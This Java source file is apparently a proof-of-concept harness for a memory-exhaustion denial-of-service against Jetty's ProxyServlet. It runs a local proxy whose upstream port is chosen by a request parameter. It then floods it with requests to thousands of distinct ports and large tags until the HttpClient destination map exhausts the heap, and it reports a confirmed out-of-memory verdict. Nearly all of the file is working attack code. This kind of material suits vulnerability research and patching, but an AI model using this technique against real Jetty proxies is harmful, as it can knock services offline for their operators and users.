package org.example.dos.dynamic;

import java.lang.reflect.Field;
import java.util.ArrayList;
import java.util.Map;

import jakarta.servlet.ServletConfig;
import jakarta.servlet.ServletException;
import jakarta.servlet.http.HttpServletRequest;
import jakarta.servlet.http.HttpServletResponse;

import org.eclipse.jetty.client.HttpClient;
import org.eclipse.jetty.client.api.Request;
import org.eclipse.jetty.proxy.ProxyServlet;
import org.eclipse.jetty.server.Server;
import org.eclipse.jetty.servlet.ServletContextHandler;
import org.eclipse.jetty.servlet.ServletHolder;

public final class JettyProxyServletHttpProbe {
    private static byte[] forceMainThreadOom() {
        ArrayList<byte[]> allocations = new ArrayList<>();
        while (true) {
            byte[] chunk = new byte[1024 * 1024];
            allocations.add(chunk);
        }
    }

    public static final class AttackerControlledProxyServlet extends ProxyServlet {
        private volatile OutOfMemoryError observedOom;

        @Override
        public void init(ServletConfig config) throws ServletException {
            super.init(config);
            getHttpClient().setConnectTimeout(1);
        }

        @Override
        protected String rewriteTarget(HttpServletRequest request) {
            String port = request.getParameter("p");
            if (port == null) {
                return null;
            }
            return "http://127.0.0.1:" + port + "/upstream";
        }

        @Override
        protected Request newProxyRequest(HttpServletRequest request, String rewrittenTarget) {
            try {
                Request proxyRequest = super.newProxyRequest(request, rewrittenTarget);
                String tag = request.getParameter("tag");
                if (tag == null) {
                    String tagBytes = request.getParameter("tagBytes");
                    String id = request.getParameter("id");
                    if (tagBytes != null && id != null) {
                        tag = ProbeSupport.uniquePayload(Integer.parseInt(id), Integer.parseInt(tagBytes));
                    }
                }
                if (tag != null) {
                    proxyRequest.tag(tag);
                }
                return proxyRequest;
            } catch (OutOfMemoryError oom) {
                observedOom = oom;
                throw oom;
            }
        }

        long destinationIdleTimeout() {
            return getHttpClient().getDestinationIdleTimeout();
        }

        OutOfMemoryError observedOom() {
            return observedOom;
        }

        @Override
        protected void service(HttpServletRequest request, HttpServletResponse response) throws ServletException, java.io.IOException {
            try {
                super.service(request, response);
            } catch (OutOfMemoryError oom) {
                observedOom = oom;
                throw oom;
            }
        }
    }

    @SuppressWarnings("unchecked")
    private static Map<?, ?> destinations(AttackerControlledProxyServlet servlet) throws Exception {
        Field clientField = org.eclipse.jetty.proxy.AbstractProxyServlet.class.getDeclaredField("_client");
        clientField.setAccessible(true);
        HttpClient client = (HttpClient) clientField.get(servlet);
        Field destinationsField = HttpClient.class.getDeclaredField("destinations");
        destinationsField.setAccessible(true);
        return (Map<?, ?>) destinationsField.get(client);
    }

    public static void main(String[] args) throws Exception {
        int requests = Integer.parseInt(args[0]);
        int payloadBytes = Integer.parseInt(args[1]);
        int progressEvery = Integer.parseInt(args[2]);
        int port = Integer.parseInt(args[3]);
        String profile = args[4];
        int upstreamBasePort = 30000;

        AttackerControlledProxyServlet servlet = new AttackerControlledProxyServlet();
        ProbeSupport.installOomExitHandler(() -> {
            try {
                System.out.println("destinationMapSizeBeforeOom=" + destinations(servlet).size());
            } catch (Exception ignored) {
                System.out.println("destinationMapSizeBeforeOom=unknown");
            }
        });

        ServletHolder holder = new ServletHolder(servlet);
        holder.setInitParameter("maxThreads", "8");
        holder.setInitParameter("timeout", "1");
        holder.setInitParameter("idleTimeout", "1");
        holder.setInitParameter("destinationIdleTimeout", "0");

        ServletContextHandler context = new ServletContextHandler();
        context.setContextPath("/");
        context.addServlet(holder, "/proxy/*");

        Server server = new Server(port);
        server.setHandler(context);
        server.start();

        ProbeSupport.printCommon("jetty-proxyservlet-real-http-destination", requests, payloadBytes, port, profile);
        System.out.println("destinationIdleTimeout=" + servlet.destinationIdleTimeout());
        System.out.flush();

        int i = 0;
        try {
            while (requests < 0 || i < requests) {
                int upstreamPort = upstreamBasePort + (i % 30000);
                String tagQuery = payloadBytes > 0 ? "&tagBytes=" + payloadBytes + "&id=" + i : "&tag=" + i;
                int code = ProbeSupport.http("GET", "http://127.0.0.1:" + port + "/proxy/?p=" + upstreamPort + tagQuery,
                        Map.of(), new byte[0]);
                if (servlet.observedOom() != null) {
                    throw servlet.observedOom();
                }
                if (code < 400) {
                    throw new IllegalStateException("expected upstream failure, got HTTP " + code);
                }
                i++;
                if (i % progressEvery == 0) {
                    long usedHeap = ProbeSupport.usedHeapBytes();
                    System.out.println("progress requests=" + i
                            + " destinationMapSize=" + destinations(servlet).size()
                            + " usedHeapBytes=" + usedHeap);
                    System.out.flush();
                    if (usedHeap > Runtime.getRuntime().maxMemory() * 97 / 100) {
                        forceMainThreadOom();
                    }
                }
            }
            System.out.println("verdict=COMPLETED");
            System.out.println("requestsCompleted=" + i);
            System.out.println("destinationMapSize=" + destinations(servlet).size());
        } catch (OutOfMemoryError oom) {
            System.out.println("verdict=CONFIRMED_HEAP_OOM_REAL_HTTP");
            System.out.println("requestsBeforeOom=" + i);
            System.out.println("destinationMapSizeBeforeOom=" + destinations(servlet).size());
            System.out.println("usedHeapBytesAtOom=" + ProbeSupport.usedHeapBytes());
            System.out.flush();
            System.exit(ProbeSupport.OOM_EXIT_CODE);
        } finally {
            server.stop();
        }
    }
}
